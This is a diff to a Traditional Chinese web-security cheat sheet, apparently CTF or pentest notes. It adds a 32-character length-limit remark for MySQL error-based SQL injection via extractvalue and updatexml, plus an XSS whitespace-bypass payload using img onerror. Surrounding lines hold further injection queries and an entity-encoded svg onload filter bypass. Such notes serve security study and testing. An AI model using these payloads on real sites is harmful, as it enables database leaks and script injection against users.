@@ -725,10 +725,10 @@ pop graphic-context
             - `ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'`
             - MySQL > 5.5.53 不會顯示查詢結果
     - xpath
-        - extractvalue
+        - extractvalue (有長度限制，32位)
             - `select extractvalue(1,concat(0x7e,(select @@version),0x7e));`
             - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
-        - updatexml
+        - updatexml (有長度限制，32位)
             - `select updatexml(1,concat(0x7e,(select @@version),0x7e),1);`
             - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
     - 主鍵重複
@@ -1838,6 +1838,8 @@ xxe.dtd:
 - 編碼繞過
     - `<svg/onload=alert(1)>`
         - `<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>` (16進位) (分號可去掉)
+- 繞空白
+    - `<img/src='1'/onerror=alert(0)>`
 ## 其他
 
 - 特殊標籤
